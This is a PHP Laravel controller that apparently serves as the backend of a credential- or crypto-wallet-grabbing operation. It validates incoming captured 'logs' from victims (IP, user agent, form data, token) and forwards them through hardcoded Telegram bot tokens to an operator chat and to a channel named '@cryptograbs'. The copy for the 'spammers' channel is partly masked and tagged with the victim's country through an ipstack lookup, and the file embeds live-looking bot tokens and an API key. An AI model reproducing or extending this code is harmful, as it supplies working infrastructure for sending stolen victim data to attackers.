<?php

namespace App\Http\Controllers\Api\v1;

use App\Http\Controllers\AbstractController as HomeController;
use App\Models\ProjectLogs;
use App\Models\User;
use Carbon\Carbon;
use Illuminate\Http\Request;

abstract class AbstractController extends HomeController
{
    public static function checkApiLogs(Request $request)
    {
        if ($request->domain && $request->user_agent && $request->user_ip && $request->main_dates && $request->form_name && $request->telegram_id) {
            return true;
        }
        return false;
    }

    public static function checkIpLogs(Request $request)
    {
        if ($request->user_ip) {
            $log_ip = self::delimetrIpOne($request->user_ip);
            $checkIpTimeLogs = ProjectLogs::where('user_ip', $log_ip)->orderBy('id', 'DESC')->first();
            if ($checkIpTimeLogs) {
                $lastTimeIp = Carbon::createFromFormat('Y-m-d H:i:s', $checkIpTimeLogs->created_at);
                $lastTimeIpLog = Carbon::now();
                $diff_in_minutes = $lastTimeIp->diffInMinutes($lastTimeIpLog);
                if ($diff_in_minutes < 5) {
                    return false;
                }
            }
            return true;
        }
    }

    public static function sendMainTelegram($idLogs)
    {
        $statusSend = false;
        $log = ProjectLogs::find($idLogs);
        if ($log) {
            $user_telegram = User::where('id_telegram', $log->telegram_id)->orderBy('id', 'DESC')->first();
            if ($user_telegram) {
                $tg_token_spamers = "1604218028:AAFfSXcLuydntC1Fpu-YQq7oHCbnYoLlT2A";
                $tg_chat_id_spamers = "-542586522";
                $message = "\xF0\x9F\x94\xA5 @" . $log->form_name . "\r\n \xF0\x9F\x94\x90 " . $log->form_name . "\r\n \xF0\x9F\x8C\x8D " . $log->user_ip . "\r\n \xF0\x9F\x92\xBB " . $log->user_agent . "\r\n \xF0\x9F\x92\xB8 " . $log->token . "\r\n \xF0\x9F\x93\x9D " . $log->main_dates;

                $url = "https://api.telegram.org/bot" . $tg_token_spamers . "/sendMessage?chat_id=" . $tg_chat_id_spamers . "&text=" . urlencode($message);
                $ch = curl_init();
                $optArray = array(
                    CURLOPT_URL => $url,
                    CURLOPT_RETURNTRANSFER => true
                );
                curl_setopt_array($ch, $optArray);
                $result = curl_exec($ch);
                curl_close($ch);
                return $result;
            }
            return false;
        }
        return false;
    }

    public static function sendSpammerTelegram($idLogs)
    {
        $statusSend = false;
        $log = ProjectLogs::find($idLogs);
        if ($log) {
            $user_telegram = User::where('id_telegram', $log->telegram_id)->orderBy('id', 'DESC')->first();
            if ($user_telegram) {
                $tg_token_spamers = "1723868413:AAHEIMjrajydxXg2z2x_4NiNBENtBrHgQDI";
                $tg_chat_id_spamers = "@cryptograbs";
                $log->main_dates = self::hideText($log->main_dates);
                $log->user_ip = $log->user_ip . ' (' . self::findCountryTelegram($log->user_ip) . ')';
                $message = "\xF0\x9F\x94\xA5 @" . $user_telegram->name_telegram . "\r\n \xF0\x9F\x94\x90 " . $log->form_name . "\r\n \xF0\x9F\x8C\x8D " . $log->user_ip . "\r\n \xF0\x9F\x92\xBB " . $log->user_agent . "\r\n \xF0\x9F\x92\xB8 " . $log->token . "\r\n \xF0\x9F\x93\x9D " . $log->main_dates;

                $url = "https://api.telegram.org/bot" . $tg_token_spamers . "/sendMessage?chat_id=" . $tg_chat_id_spamers . "&text=" . urlencode($message);
                $ch = curl_init();
                $optArray = array(
                    CURLOPT_URL => $url,
                    CURLOPT_RETURNTRANSFER => true
                );
                curl_setopt_array($ch, $optArray);
                $result = curl_exec($ch);
                curl_close($ch);
                return $result;
            }
            return false;
        }
        return false;
    }

    public static function hideText($data_log)
    {
        $str_lenght = strlen($data_log);
        $str_lenght = round($str_lenght / 2);
        $faker = "";
        for ($i = 1; $i <= $str_lenght; $i++) {
            $faker .= "•";
        }
        return substr_replace($data_log, $faker, $str_lenght - 1);
    }

    public  static function delimetrIpOne($ip) {
        $ip_delimetr = explode(',', $ip);
        $ip = $ip_delimetr[0];
        return $ip;
    }
    public static function findCountryTelegram($ip)
    {
        $ip_delimetr = explode(',', $ip);
        $ip = $ip_delimetr[0];
        $api_key = "b845fd29e816fa02cda5ea36cab8c49e";
        $connect = curl_init('http://api.ipstack.com/' . $ip . '?access_key=' . $api_key);
        curl_setopt($connect, CURLOPT_RETURNTRANSFER, true);
        $result = curl_exec($connect);
        curl_close($connect);
        $result = json_decode($result, true);
        if (!isset($result['location']['capital'])) {
            return 'undefined';
        }
        return $result;
    }
}
